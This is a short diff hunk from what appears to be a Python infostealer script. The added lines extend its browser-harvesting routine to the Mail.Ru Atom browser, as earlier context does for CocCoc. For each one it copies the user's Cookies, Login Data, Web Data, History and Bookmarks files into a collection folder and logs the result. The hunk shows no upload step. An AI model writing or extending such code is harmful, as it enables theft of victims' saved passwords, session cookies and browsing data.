@@ -284,7 +284,23 @@ try:
 					find("Web Data", src, "\\CocCoc\\")
 					print(" 	{+} CocCoc")
 				except OSError:
-					print(" 	{+} CocCoc")	
+					print(" 	{+} CocCoc")
+
+
+			if os.path.exists("C:/Users/{0}/AppData/Local/Mail.Ru/Atom/User Data/Default".format(user)):
+				src = "C:/Users/{0}/AppData/Local/Mail.Ru/Atom/User Data/Default".format(user)
+				if os.path.exists(dio + "\\Atom"):
+					shutil.rmtree(dio + "\\Atom")
+				os.makedirs(dio + "\\Atom")
+				try:
+					find("Cookies", src, "\\Atom\\")
+					find("Bookmarks", src, "\\Atom\\")
+					find("History", src, "\\Atom\\")
+					find("Login Data", src, "\\Atom\\")
+					find("Web Data", src, "\\Atom\\")
+					print(" 	{+} Atom")
+				except OSError:
+					print(" 	{+} Atom")	
 		browsers()
 		print(")")
 		logfile.write("\n)")
